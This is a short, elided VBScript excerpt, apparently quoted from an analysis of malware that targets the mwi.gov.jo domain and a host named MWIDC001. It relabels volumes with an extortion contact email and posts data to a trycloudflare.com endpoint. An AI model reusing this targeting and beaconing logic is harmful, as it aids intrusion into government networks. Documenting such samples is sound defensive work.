...
For Each objItem in colItems
	if CreateObject("ADSystemInfo").DomainDNSName <> "mwi.gov.jo" then
...
For Each objItem In colItems
	...
	objItem.Label="Tel jordanservicen1@proton.me"
	objItem.Put_
Next
...
httpRequest.Open "POST", "https://generated-eating-meals-top.trycloudflare.com/updatelog", False
...
Set fso = CreateObject("Scripting.FileSystemObject")
if CreateObject("WScript.Network").ComputerName = "MWIDC001" then
